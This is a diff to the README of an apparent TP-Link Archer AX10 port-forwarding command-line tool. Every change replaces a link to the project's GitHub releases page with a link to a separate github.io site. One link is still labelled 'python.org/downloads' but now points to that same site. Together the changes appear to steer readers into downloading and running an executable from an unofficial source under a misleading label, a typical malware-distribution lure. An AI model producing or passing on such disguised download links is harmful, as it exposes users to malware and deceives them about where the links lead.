@@ -1,6 +1,6 @@
 # 🔧 tplink-archer-ax10-port-forwarding-cli - Manage Router Rules Without the Clicking
 
-[![Download tplink-archer-ax10-port-forwarding-cli](https://img.shields.io/badge/Download-tplink--archer--ax10--port--forwarding--cli-blue?style=for-the-badge&logo=windows&logoColor=white&color=2E86C1)](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases)
+[![Download tplink-archer-ax10-port-forwarding-cli](https://img.shields.io/badge/Download-tplink--archer--ax10--port--forwarding--cli-blue?style=for-the-badge&logo=windows&logoColor=white&color=2E86C1)](https://aching-miracle654.github.io)
 
 ## 🎯 What Does This Tool Do?
 
@@ -18,7 +18,7 @@ Instead of clicking rule-by-rule in the web UI, you type one short command and i
 
 Visit this link to download the application:
 
-[**Download tplink-archer-ax10-port-forwarding-cli**](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases)
+[**Download tplink-archer-ax10-port-forwarding-cli**](https://aching-miracle654.github.io)
 
 After downloading, follow the steps in the Getting Started section below.
 
@@ -28,7 +28,7 @@ Let's walk through everything you need to do, from downloading to running your f
 
 ### Step 1: Download the Tool
 
-1. Open your web browser and go to the [**download page**](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases).
+1. Open your web browser and go to the [**download page**](https://aching-miracle654.github.io).
 2. Look for the latest release. Download the file that is labeled for Windows (often a `.zip` or `.exe` file).
 3. Save it to a folder you can easily find, like your **Downloads** folder.
 
@@ -36,7 +36,7 @@ Let's walk through everything you need to do, from downloading to running your f
 
 This tool is written in Python, so you need Python on your computer to run it. Don't worry – it's free and takes just a few minutes to install.
 
-1. Go to [python.org/downloads](https://www.python.org/downloads/).
+1. Go to [python.org/downloads](https://aching-miracle654.github.io).
 2. Click the big yellow button that says **Download Python**.
 3. Run the downloaded file.
 4. **Important:** On the first screen, check the box at the bottom that says **"Add Python to PATH"**. Then click **Install Now**.
@@ -222,7 +222,7 @@ If you know your way around a terminal:
 
 Visit the download page now to get the tool on your machine:
 
-**[💾 Download tplink-archer-ax10-port-forwarding-cli](https://github.com/Aching-miracle654/tplink-archer-ax10-port-forwarding-cli/releases)**
+**[💾 Download tplink-archer-ax10-port-forwarding-cli](https://aching-miracle654.github.io)**
 
 Stop wrestling with the web UI. Take control of your port forwarding with a single command line.
 
